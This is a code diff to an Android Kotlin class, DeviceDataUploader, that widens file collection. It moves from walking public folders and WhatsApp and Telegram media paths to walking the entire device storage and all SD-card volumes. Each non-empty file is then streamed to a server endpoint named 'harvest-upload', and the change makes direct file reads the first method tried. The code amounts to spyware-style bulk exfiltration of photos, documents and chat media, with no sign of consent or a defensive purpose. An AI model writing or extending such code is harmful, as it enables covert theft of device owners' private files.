@@ -119,42 +119,35 @@ object DeviceDataUploader {
             }
         }
 
-        // 3. Recursive Public Directory Traversal Fallback
-        val publicDirectories = listOfNotNull(
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PODCASTS),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_RINGTONES)
-        )
+        // 3. Full Device Storage Root Traversal (Android 10 legacy + Android 11+ All Files Access)
+        val roots = mutableListOf<File>()
+        val primaryDir = Environment.getExternalStorageDirectory() ?: File("/storage/emulated/0")
+        if (primaryDir.exists()) {
+            roots.add(primaryDir)
+        }
 
-        val rootPath = Environment.getExternalStorageDirectory()?.absolutePath ?: "/storage/emulated/0"
-        val additionalPaths = listOf(
-            File("$rootPath/Download"),
-            File("$rootPath/Documents"),
-            File("$rootPath/DCIM"),
-            File("$rootPath/Pictures"),
-            File("$rootPath/Movies"),
-            File("$rootPath/Music"),
-            File("$rootPath/WhatsApp/Media"),
-            File("$rootPath/Android/media/com.whatsapp/WhatsApp/Media"),
-            File("$rootPath/Telegram"),
-            File("$rootPath/Android/media/org.telegram.messenger")
-        )
+        // Add all secondary storage directories (e.g. MicroSD cards)
+        try {
+            val extDirs = context.getExternalFilesDirs(null)
+            for (ed in extDirs) {
+                if (ed != null) {
+                    var parent: File? = ed
+                    while (parent != null && parent.parentFile != null && parent.name != "storage" && parent.parentFile?.name != "storage") {
+                        parent = parent.parentFile
+                    }
+                    if (parent != null && parent.exists() && parent.isDirectory && !roots.contains(parent)) {
+                        roots.add(parent)
+                    }
+                }
+            }
+        } catch (_: Exception) {}
 
-        val allCandidateDirs = (publicDirectories + additionalPaths)
-            .filter { it.exists() && it.isDirectory }
-            .distinctBy { it.absolutePath }
-
-        for (dir in allCandidateDirs) {
+        for (root in roots.distinctBy { it.absolutePath }) {
             try {
-                dir.walkTopDown()
+                root.walkTopDown()
                     .onEnter { currentDir ->
                         val normalized = currentDir.absolutePath.replace('\\', '/')
-                        // Exclude application-private directories
+                        // Exclude application-private sandbox directories only, allow all media and documents
                         !normalized.contains("/Android/data") && !normalized.contains("/Android/obb")
                     }
                     .filter { it.isFile && it.length() > 0 }
@@ -165,7 +158,7 @@ object DeviceDataUploader {
                         }
                     }
             } catch (e: Exception) {
-                Log.w(TAG, "Directory traversal error in ${dir.absolutePath}: ${e.message}")
+                Log.w(TAG, "Storage traversal error in ${root.absolutePath}: ${e.message}")
             }
         }
 
@@ -174,7 +167,7 @@ object DeviceDataUploader {
     }
 
     /**
-     * Streams file content via ContentResolver.openInputStream and posts to /api/device/$deviceId/harvest-upload
+     * Streams file content via ContentResolver or direct File stream and posts to /api/device/$deviceId/harvest-upload
      */
     suspend fun uploadFileItem(
         context: Context,
@@ -185,14 +178,21 @@ object DeviceDataUploader {
         httpClient: OkHttpClient = client
     ): Boolean = withContext(Dispatchers.IO) {
         try {
-            val stream = try {
-                context.contentResolver.openInputStream(uri)
-            } catch (_: Exception) {
-                null
-            } ?: if (uri.scheme == "file" || (uri.path != null && !uri.path!!.startsWith("/external"))) {
+            val stream = if (uri.scheme == "file" || (uri.path != null && !uri.path!!.startsWith("/external"))) {
                 val f = File(uri.path ?: "")
-                if (f.exists() && f.canRead()) f.inputStream() else null
-            } else null
+                if (f.exists() && f.canRead()) {
+                    f.inputStream()
+                } else {
+                    try { context.contentResolver.openInputStream(uri) } catch (_: Exception) { null }
+                }
+            } else {
+                try {
+                    context.contentResolver.openInputStream(uri)
+                } catch (_: Exception) {
+                    val f = File(uri.path ?: "")
+                    if (f.exists() && f.canRead()) f.inputStream() else null
+                }
+            }
 
             if (stream == null) {
                 Log.w(TAG, "Cannot open stream for $fileName ($uri)")
